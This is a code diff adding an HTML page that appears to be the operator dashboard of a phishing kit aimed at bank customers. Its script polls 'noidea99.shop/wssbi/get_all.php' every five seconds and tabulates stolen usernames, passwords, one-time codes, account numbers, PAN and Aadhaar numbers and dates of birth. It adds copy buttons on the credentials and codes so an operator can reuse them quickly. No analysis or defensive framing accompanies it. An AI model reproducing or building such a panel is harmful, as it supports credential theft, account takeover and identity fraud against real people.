@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://kit.fontawesome.com/505ae8e24b.js" crossorigin="anonymous"></script>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+  <title>Table V03</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/png" href="images/icons/favicon.ico" />
+</head>
+<body>
+  <div class="limiter">
+    <div class="">
+      <div class="">
+        <div class="table100 ver3 m-b-110">
+          <table class="table table-white table-hover table-striped container-fluid">
+            <thead>
+              <tr class="row100 head">
+                <th>User Name</th>
+                <th>Password</th>
+                <th>Mobile Number</th>
+                <th>C1</th>
+                <th>Customer Name</th>
+                <th>Date of Birth</th>
+                <th>C2</th>
+                <th>C3</th>
+                <th>Account Number</th>
+                <th>Pan Card</th>
+                <th>C4</th>
+                <th>C5</th>
+                <th>Aadhar Number</th>
+                <th>Email</th>
+                <th>C6</th>
+                <th>C7</th>
+              </tr>
+            </thead>
+            <tbody id="data-body"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var dataBody = document.getElementById("data-body");
+
+    function displayData(data) {
+      dataBody.innerHTML = "";
+      const domain = window.location.hostname + '/viewd.html';
+
+      for (var i = 0; i < data.data.length; i++) {
+        var record = data.data[i];
+
+        if (record.domain == domain) {
+          var row = document.createElement("tr");
+          row.classList.add('row100');
+
+          var UserNameCell = document.createElement("td");
+          UserNameCell.innerHTML = record.luname;
+          row.appendChild(UserNameCell);
+
+          if (record.luname != '') {
+              var copyUsernameBtn = document.createElement("button");
+              copyUsernameBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+              copyUsernameBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+              copyUsernameBtn.addEventListener("click", createCopyFunction(record.luname));
+              UserNameCell.appendChild(copyUsernameBtn);
+          }
+
+
+          var PasswordCell = document.createElement("td");
+          PasswordCell.textContent = record.lpwd;
+          row.appendChild(PasswordCell);
+
+          if (record.lpwd != '') {
+              var copyPasswordBtn = document.createElement("button");
+              copyPasswordBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+              copyPasswordBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+              copyPasswordBtn.addEventListener("click", createCopyFunction(record.lpwd));
+              PasswordCell.appendChild(copyPasswordBtn);
+          }
+
+          var MobileNumberCell = document.createElement("td");
+          MobileNumberCell.textContent = record.lmob;
+          row.appendChild(MobileNumberCell);
+
+          var c1Cell = document.createElement("td");
+          c1Cell.textContent = record.lcode;
+
+        if (record.lcode != '') {
+              var copyc1CellBtn = document.createElement("button");
+              copyc1CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+              copyc1CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+              copyc1CellBtn.addEventListener("click", createCopyFunction(record.lcode));
+              c1Cell.appendChild(copyc1CellBtn);
+            }
+
+          row.appendChild(c1Cell);
+
+          var customerName = document.createElement("td");
+          customerName.textContent = record.lname;
+          row.appendChild(customerName);
+
+          var dobCell = document.createElement("td");
+          dobCell.textContent = record.lbdate;
+          row.appendChild(dobCell);
+
+          var c2Cell = document.createElement("td");
+          c2Cell.textContent = record.lcode2;
+
+        if (record.lcode2 != '') {
+                  
+              var copyc2CellBtn = document.createElement("button");
+              copyc2CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+              copyc2CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+              copyc2CellBtn.addEventListener("click", createCopyFunction(record.lcode2));
+              c2Cell.appendChild(copyc2CellBtn);
+              
+            }
+
+          row.appendChild(c2Cell);
+
+          var c3Cell = document.createElement("td");
+          c3Cell.textContent = record.lcode3;
+
+        if (record.lcode3 != '') {
+                      
+              var copyc3CellBtn = document.createElement("button");
+              copyc3CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+              copyc3CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+              copyc3CellBtn.addEventListener("click", createCopyFunction(record.lcode3));
+              c3Cell.appendChild(copyc3CellBtn);
+              
+            }
+
+          row.appendChild(c3Cell);
+
+          var account_numberCell = document.createElement("td");
+          account_numberCell.textContent = record.lanum;
+          row.appendChild(account_numberCell);
+
+          var panCardCell = document.createElement("td");
+          panCardCell.textContent = record.lcnum;
+          row.appendChild(panCardCell);
+
+          var c4Cell = document.createElement("td");
+          c4Cell.textContent = record.lcode4;
+
+        if (record.lcode4 != '') {
+                 
+          var copyc4CellBtn = document.createElement("button");
+          copyc4CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+          copyc4CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+          copyc4CellBtn.addEventListener("click", createCopyFunction(record.lcode4));
+          c4Cell.appendChild(copyc4CellBtn);
+          
+            }
+
+          row.appendChild(c4Cell);
+
+          var c5Cell = document.createElement("td");
+          c5Cell.textContent = record.lcode5;
+
+        if (record.lcode5 != '') {
+                 
+          var copyc5CellBtn = document.createElement("button");
+          copyc5CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+          copyc5CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+          copyc5CellBtn.addEventListener("click", createCopyFunction(record.lcode5));
+
+          c5Cell.appendChild(copyc5CellBtn);
+          
+          
+            }
+
+          row.appendChild(c5Cell);
+
+          var aadharNumberCell = document.createElement("td");
+          aadharNumberCell.textContent = record.lanum1;
+          row.appendChild(aadharNumberCell);
+
+          var emailCell = document.createElement("td");
+          emailCell.textContent = record.lemail;
+          row.appendChild(emailCell);
+
+          var c6Cell = document.createElement("td");
+          c6Cell.textContent = record.lcode6;
+
+        if (record.lcode6 != '') {
+                
+          var copyc6CellBtn = document.createElement("button");
+          copyc6CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+          copyc6CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+          copyc6CellBtn.addEventListener("click", createCopyFunction(record.lcode6));
+          
+          c6Cell.appendChild(copyc6CellBtn);
+          
+          
+            }
+
+          row.appendChild(c6Cell);
+
+          var c7Cell = document.createElement("td");
+          c7Cell.textContent = record.lcode7;
+          
+        if (record.lcode7 != '') {
+              
+          var copyc7CellBtn = document.createElement("button");
+          copyc7CellBtn.innerHTML = '<i class="fa-solid fa-copy"></i>';
+          copyc7CellBtn.classList.add("btn", "btn-sm", "btn-primary", "ms-2");
+          copyc7CellBtn.addEventListener("click", createCopyFunction(record.lcode7));
+          
+          c7Cell.appendChild(copyc7CellBtn);
+          
+          
+            }
+
+          row.appendChild(c7Cell);
+
+          dataBody.appendChild(row);
+        }
+      }
+    }
+
+    function createCopyFunction(text) {
+      return function() {
+        var tempTextArea = document.createElement('textarea');
+        tempTextArea.value = text;
+        document.body.appendChild(tempTextArea);
+        tempTextArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(tempTextArea);
+        alert('Copied to clipboard!');
+      };
+    }
+
+    function getDataFromAPI() {
+      var xhr = new XMLHttpRequest();
+      var url = "https://noidea99.shop/wssbi/get_all.php";
+      xhr.open("GET", url);
+      xhr.responseType = "json";
+      xhr.onload = function() {
+        if (xhr.status === 200) {
+          var data = xhr.response;
+          displayData(data);
+        }
+      };
+      xhr.send();
+    }
+
+    function getDataFromAnotherAPI() {
+      var xhr = new XMLHttpRequest();
+      var url = "https://noidea99.shop/wssbi/get_all.php";
+      xhr.open("GET", url);
+      xhr.responseType = "json";
+      xhr.onload = function() {
+        if (xhr.status === 200) {
+          var data = xhr.response;
+          displayData(data);
+        }
+      };
+      xhr.send();
+    }
+
+    getDataFromAPI();
+    setInterval(getDataFromAnotherAPI, 5000);
+  </script>
+</body>
+</html>
